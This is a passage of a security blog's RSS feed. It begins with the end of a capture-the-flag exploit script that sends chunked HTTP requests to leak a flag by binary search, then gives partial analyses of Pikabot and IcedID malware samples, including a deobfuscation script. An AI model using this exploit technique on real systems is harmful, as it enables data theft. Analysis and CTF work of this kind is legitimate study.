&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">query&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;0&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">make_request&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Transfer-Encoding&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;chunked&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">PATH&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">status_code&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">find_letter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">end&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">end&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">start&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">//&lt;/span> &lt;span class="mi">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">q&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">build_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mid&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">correct&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">make_request&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">correct&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mid&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">end&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mid&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[i] LEAKING FLAG: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">letter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="n">letter&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;}&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">letter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">find_letter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ctr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">letter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Pikabot malware analysis</title><link>https://Kvn11.github.io/p/pikabot-malware-analysis/</link><pubDate>Tue, 12 Dec 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/pikabot-malware-analysis/</guid><description>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/cover.jpg" alt="Featured image of post Pikabot malware analysis" />&lt;h2 id="sample-info">Sample Info
&lt;/h2>&lt;p>&lt;a class="link" href="https://bazaar.abuse.ch/sample/7e26c4f6f313e5248898a1dbe706ae5b998e12ff16947cb3bfda690ca62612c4/" target="_blank" rel="noopener"
>7e26c4f6f313e5248898a1dbe706ae5b998e12ff16947cb3bfda690ca62612c4&lt;/a>&lt;/p>
&lt;h2 id="initial-analysis">Initial Analysis
&lt;/h2>&lt;p>Based on low number of imports, plus a large and high entropy &lt;code>.rsrc&lt;/code> section, this sample is likely packed.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/1.png"
width="1722"
height="979"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/1_hu13cb723cd146546c5aee643d874fbbe8_325239_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/1_hu13cb723cd146546c5aee643d874fbbe8_325239_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Signs of packing "
class="gallery-image"
data-flex-grow="175"
data-flex-basis="422px"
>&lt;/p>
&lt;p>Among the imports are &lt;code>IsDebuggerPresent&lt;/code> and &lt;code>GetTickCount&lt;/code> which could be signs of anti-vm techniques that are present in this sample as well.
There were also a large number of exports, all named after some drawing related functionality.&lt;/p>
&lt;h2 id="loader">Loader
&lt;/h2>&lt;p>In the DLLMain that binja finds, there is a call to &lt;code>DisableThreadLibraryCalls&lt;/code> which is a tactic that increases the invisibility of the DLL.
It will disable the &lt;code>DLL_THREAD_ATTACH&lt;/code> and &lt;code>DLL_THREAD_DETACH&lt;/code> notifications.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/3.png"
width="567"
height="523"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/3_hue805e339c6ee061dc9b0a9b72fa70e31_32772_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/3_hue805e339c6ee061dc9b0a9b72fa70e31_32772_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Nothing much here "
class="gallery-image"
data-flex-grow="108"
data-flex-basis="260px"
>&lt;/p>
&lt;p>However, there isn&amp;rsquo;t much more to see within this main function.
Due to the massive amount of exports, and not having access to the delivery method part of the sample, figuring out the function responsible for unpacking is going to be difficult.
However, Pikabot is known to use a lot of anti analysis, so a good place to start would be to look for usage of &lt;code>IsDebuggerPresent&lt;/code>, since the locations in where it appears are likely part of the unpacking process.
And fortunately, it only appears once, making this idea a success.
This gives me a starting point from where I can start unraveling this sample.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/2.png"
width="446"
height="349"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/2_hu2df0f785e6ae0e7160f90aef749e3016_17086_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/2_hu2df0f785e6ae0e7160f90aef749e3016_17086_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Turning the table on their anti-anlysis "
class="gallery-image"
data-flex-grow="127"
data-flex-basis="306px"
>&lt;/p>
&lt;p>Unfortunately, following up the call history still results in a lot of options for arriving to this check, so I decide to use process of elimination to start getting rid of some of the exported functions.&lt;/p>
&lt;p>** WORK IN PROGRESS **&lt;/p>
&lt;h2 id="payload">Payload
&lt;/h2>&lt;p>I jumped ahead with &lt;code>unpac.me&lt;/code> to unpack the sample and start looking at the main payload.
Right away, we can see that there is some multiplication of values (maybe a potential key), and data is being copied into some buffers.
There are also references to chrome extensions in some of the strings in this &lt;code>_start&lt;/code> function.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/4.png"
width="1402"
height="958"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/4_hu50483309ffed67801f93d006fe34db24_102461_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/4_hu50483309ffed67801f93d006fe34db24_102461_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Pretty straightforward "
class="gallery-image"
data-flex-grow="146"
data-flex-basis="351px"
>&lt;/p>
&lt;p>There does seem to be some level of obfuscation when determining the indices of the arrays by using while loops with 2 conditions, one of them being impossible.&lt;/p></description></item><item><title>IcedID Malware config extraction</title><link>https://Kvn11.github.io/p/icedid-malware-config-extraction/</link><pubDate>Fri, 01 Dec 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/icedid-malware-config-extraction/</guid><description>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/cover.jpg" alt="Featured image of post IcedID Malware config extraction" />&lt;h2 id="sample-info">Sample Info
&lt;/h2>&lt;p>&lt;a class="link" href="https://bazaar.abuse.ch/sample/0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7/" target="_blank" rel="noopener"
>0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7&lt;/a>&lt;/p>
&lt;h2 id="initial-analysis">Initial Analysis
&lt;/h2>&lt;p>Based on the few number of imports, and the size of the &lt;code>.data&lt;/code> section, this sample is likely packed.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/1.png"
width="347"
height="216"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/1_hu255b867e81cdd1e8e185420027246aaa_3569_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/1_hu255b867e81cdd1e8e185420027246aaa_3569_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Why so little imports?"
class="gallery-image"
data-flex-grow="160"
data-flex-basis="385px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/2.png"
width="727"
height="205"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/2_hubc1cad610922c751ddb0116b9095aedb_7093_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/2_hubc1cad610922c751ddb0116b9095aedb_7093_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Sus data"
class="gallery-image"
data-flex-grow="354"
data-flex-basis="851px"
>&lt;/p>
&lt;h2 id="unpacking">Unpacking
&lt;/h2>&lt;p>Unpacking proved to be more difficult than expected.
None of my breakpoints every got reached because my debugger exited before ever reaching the sample&amp;rsquo;s entry point.
Additionally, after &lt;code>x64dbg&lt;/code>&amp;rsquo;s call to &lt;code>LoadLibraryW&lt;/code> to load the sample, I could see that the sample had some memory reserved, but none of it&amp;rsquo;s sections were mapped.
I figured it was probably receiving the wrong reason from the calling process and this was an anti analysis feature.
But then after looking at &lt;code>PE-Bear&lt;/code> a lil more I realized that this &lt;code>DLL&lt;/code> has a number of exports, so I could just use &lt;code>rundll.exe&lt;/code> to call the functions manually and pass this obstacle.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/3.png"
width="485"
height="179"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/3_hu708130b302a993688ca264c0cc7d003f_4862_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/3_hu708130b302a993688ca264c0cc7d003f_4862_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Exported functions from the Dll"
class="gallery-image"
data-flex-grow="270"
data-flex-basis="650px"
>&lt;/p>
&lt;p>After the dll is loaded in &lt;code>x64dbg&lt;/code>, I just set breakpoints on each of the exported functions.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/4.png"
width="1248"
height="150"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/4_hu170abdabdf5855104ad8dd7b5693693f_18516_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/4_hu170abdabdf5855104ad8dd7b5693693f_18516_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Breakpoints"
class="gallery-image"
data-flex-grow="832"
data-flex-basis="1996px"
>&lt;/p>
&lt;p>When continuing, the first breakpoints I hit is the first function I called, &lt;code>DllRegisterServer&lt;/code>.
This function was filled with instructions like &lt;code>cmp al, al; jne&lt;/code> which were interesting because I don&amp;rsquo;t think the jump would ever trigger.
My thought is that this was supposed to be an anti analysis technique.
Also, I quickly realized that debugging without knowing what I was looking for would be confusing and not very fruitful so I went back to binja to do some static analysis.
However, due to the fake branching, the code is a bit convuluted and hard to follow.
I decided to make a script to get rid of them.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">is_fake_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;cmp&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">op1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">op2&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">is_jump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;je&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;jne&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;jz&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;jnz&amp;#34;&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">find_fake_jmps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">basic_block&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fake_jmps&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">instructions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basic_block&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_disassembly_text&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">ctr&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instructions&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instructions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">ctr&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">is_fake_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(f&amp;#34;[i] Fake cmp @ 0x{instr.address:016X}&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">next_instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instructions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">ctr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">is_jump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">next_instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[*] FOUND FAKE jump @ 0x&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">next_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">016X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fake_jmps&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">next_instr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">fake_jmps&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">patch_fake_jmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr_pair&lt;/span>&lt;span class="p">):&lt;/span>
